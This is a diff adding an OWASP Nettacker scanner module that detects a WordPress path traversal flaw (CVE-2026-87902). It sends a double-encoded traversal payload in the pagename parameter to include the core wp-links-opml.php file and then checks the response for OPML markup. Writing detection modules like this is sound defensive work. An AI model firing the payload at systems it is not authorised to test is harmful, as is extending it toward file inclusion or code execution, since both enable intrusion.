@@ -1,0 +1,56 @@
+info:
+  name: wp_templates_cve_2026_87902_vuln
+  author: OWASP Nettacker Team
+  severity: 9.2
+  description: > 
+    An unauthenticated attacker can exploit a path traversal vulnerability in the
+    `get_page_template()` function to force page-template resolution to include an
+    arbitrary, readable local `.php` file outside the active theme directories. If
+    specific server and active theme pre-conditions are met, this file inclusion can lead to RCE.
+    This module detects the vulnerability by executing a path traversal attack,
+    climbing the directory tree from the theme directory to reach the project root
+    and requesting the core `wp-links-opml.php` file. A successful response containing
+    the expected OPML structure confirms the presence of the flaw.
+  references: 
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-87902
+    - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-7hp8-65ch-5whp
+    - https://hadrian.io/vulnerability-alerts/cve-2026-87902-working-poc-wordpress-critical-path-traversal 
+  profiles:
+    - vuln
+    - http
+    - cve
+    - cve2026
+    - critical_severity
+    - wordpress
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}?page_id=2&pagename=templates%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fwp-links-opml"
+            prefix: ""
+            suffix: ""
+            interceptors: ""
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: <opml
+              reverse: false
